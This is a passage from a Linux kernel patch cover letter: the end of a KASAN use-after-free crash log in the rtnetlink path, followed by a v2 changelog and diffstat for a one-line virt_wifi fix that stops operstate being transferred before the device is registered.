[    8.204135]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[    8.204137]  ___sys_sendmsg (net/socket.c:2767)
[    8.204139]  __sys_sendmsg (net/socket.c:2799)
[    8.204140]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[    8.204142]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    8.204144]
[    8.204144] Freed by task 267:
[    8.204145]  kasan_save_stack (mm/kasan/common.c:57)
[    8.204146]  kasan_save_track (mm/kasan/common.c:78)
[    8.204148]  kasan_save_free_info (mm/kasan/generic.c:584)
[    8.204150]  __kasan_slab_free (mm/kasan/common.c:253 mm/kasan/common.c:285)
[    8.204152]  kfree (include/linux/kasan.h:235 mm/slub.c:2748 mm/slub.c:6499 mm/slub.c:6792)
[    8.204154]  rtnl_newlink (net/core/rtnetlink.c:3973 net/core/rtnetlink.c:4098 net/core/rtnetlink.c:4215)
[    8.204155]  rtnetlink_rcv_msg (net/core/rtnetlink.c:7132)
[    8.204157]  netlink_rcv_skb (net/netlink/af_netlink.c:2556)
[    8.204160]  netlink_unicast (net/netlink/af_netlink.c:1319 net/netlink/af_netlink.c:1345)
[    8.204162]  netlink_sendmsg (net/netlink/af_netlink.c:1900)
[    8.204164]  ____sys_sendmsg (net/socket.c:800 (discriminator 1) net/socket.c:815 (discriminator 1) net/socket.c:2713 (discriminator 1))
[    8.204166]  ___sys_sendmsg (net/socket.c:2767)
[    8.204167]  __sys_sendmsg (net/socket.c:2799)
[    8.204168]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[    8.204170]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[    8.204172]
[    8.204172] The buggy address belongs to the object at ffff888007024000
[    8.204172]  which belongs to the cache kmalloc-4k of size 4096
[    8.204174] The buggy address is located 1416 bytes inside of
[    8.204174]  freed 4096-byte region [ffff888007024000, ffff888007025000)
[    8.204176]
[    8.204177] The buggy address belongs to the physical page:
[    8.204178] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x7020
[    8.204180] head: order:3 mapcount:0 entire_mapcount:0 nr_pages_mapped:0 pincount:0
[    8.204181] flags: 0x100000000000040(head|node=0|zone=1)
[    8.204184] page_type: f5(slab)
[    8.204186] raw: 0100000000000040 ffff8880010433c0 ffffea00001c1210 ffffea00001c3c10
[    8.204188] raw: 0000000000000000 0000000000020002 00000000f5000000 0000000000000000
[    8.204190] head: 0100000000000040 ffff8880010433c0 ffffea00001c1210 ffffea00001c3c10
[    8.204191] head: 0000000000000000 0000000000020002 00000000f5000000 0000000000000000
[    8.204193] head: 0100000000000003 fffffffffffffe01 00000000ffffffff 00000000ffffffff
[    8.204194] head: 0000000000000000 0000000000000000 00000000ffffffff 0000000000000000
[    8.204195] page dumped because: kasan: bad access detected
[    8.204196]
[    8.204196] Memory state around the buggy address:
[    8.204197]  ffff888007024480: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.204199]  ffff888007024500: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.204200] >ffff888007024580: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.204201]                       ^
[    8.204202]  ffff888007024600: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.204203]  ffff888007024680: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    8.204204] ==================================================================
[    8.204205] Disabling lock debugging due to kernel taint
-----END crash log-----

Best regards,
Zihan Xi

changes in v2:
  - Fix virt_wifi_newlink() instead of dropping events in
    linkwatch_fire_event().
  - Fixes: c7cdba31ed8b, the commit that added virt_wifi.
  - v1 Link:
    https://lore.kernel.org/all/cover.1788500348.git.zihanx@nebusec.ai/

Zihan Xi (1):
  wifi: virt_wifi: don't transfer operstate before register

 drivers/net/wireless/virtual/virt_wifi.c | 3 ++-
 1 file changed, 2 insertions(+), 1 deletion(-)

-- 
2.43.0

